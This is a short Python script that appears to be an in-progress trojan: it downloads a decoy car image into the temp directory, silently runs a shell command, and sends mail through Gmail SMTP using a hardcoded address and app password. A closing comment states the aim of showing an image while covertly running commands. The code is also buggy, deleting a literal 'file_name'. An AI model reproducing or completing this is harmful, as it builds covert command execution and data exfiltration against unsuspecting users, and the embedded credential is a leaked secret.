#!/usr/bin/env python

import requests,subprocess,smtplib,os,tempfile

def download(url):
    response = requests.get(url)
    file_name = url.split("/")[-1]
    #print(response.content)
    with open(file_name,"wb") as file:
        file.write(response.content)


def send_email(email,password,message):
    server = smtplib.SMTP("smtp.gmail.com",587)
    server.starttls()
    server.login(email,password)
    server.sendmail(email,email,message)
    server.quit()


# new email -->
temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)
download("https://cdn.motor1.com/images/mgl/rMjOr/s1/2022-nissan-gt-r-nismo-special-edition.jpg")
result = subprocess.check_output("ls -la",shell=True)
send_email("cyberheresec@gmail.com","btapydlbtadqldyg","hello there")
os.remove("file_name")


#subprocess call and open an image after that run the actual command without showing any prompt
